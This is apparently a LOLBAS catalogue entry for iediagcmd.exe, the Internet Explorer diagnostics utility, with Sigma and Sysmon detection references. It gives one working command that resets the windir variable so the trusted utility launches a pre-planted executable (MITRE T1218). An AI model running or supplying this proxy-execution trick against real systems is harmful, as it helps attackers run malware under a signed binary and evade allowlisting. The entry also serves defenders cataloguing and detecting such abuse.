---
Acknowledgement:
- Person: A
Author: manasmbellani
Commands:
- Category: Execute
  Command: set windir=c:\test& cd "C:\Program Files\Internet Explorer\" & iediagcmd.exe
    /out:{PATH_ABSOLUTE:.cab}
  Description: Executes binary that is pre-planted at C:\test\system32\netsh.exe.
  MitreID: T1218
  OperatingSystem: Windows 10 1803, Windows 10 1703, Windows 10 22H1, Windows 10 22H2,
    Windows 11
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: Spawn a pre-planted executable from iediagcmd.exe.
Created: 2022-03-29
Description: Diagnostics Utility for Internet Explorer
Detection:
- Sigma: https://github.com/manasmbellani/mycode_public/blob/master/sigma/rules/win_proc_creation_lolbin_iediagcmd.yml
- IOC: Sysmon Event ID 1
- IOC: Execution of process iediagcmd.exe with /out could be suspicious
Full_Path:
- Path: C:\Program Files\Internet Explorer\iediagcmd.exe
Name: iediagcmd.exe
Resources:
- Link: https://twitter.com/Hexacorn/status/1507516393859731456
mitre_data:
  technique_ids:
  - T1218
tags:
- lolbas/osbinaries
---

# iediagcmd.exe

Diagnostics Utility for Internet Explorer

# Path(s)

- `C:\Program Files\Internet Explorer\iediagcmd.exe`

# Execute Commands

Executes binary that is pre-planted at C:\test\system32\netsh.exe.

```batch
set windir=c:\test& cd "C:\Program Files\Internet Explorer\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}
```

- **Usecase:** Spawn a pre-planted executable from iediagcmd.exe.
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows 10 1803, Windows 10 1703, Windows 10 22H1, Windows 10 22H2, Windows 11



# Resource(s)

- https://twitter.com/Hexacorn/status/1507516393859731456
# Acknowledgements

- manasmbellani (Authored, 2022-03-29)
- A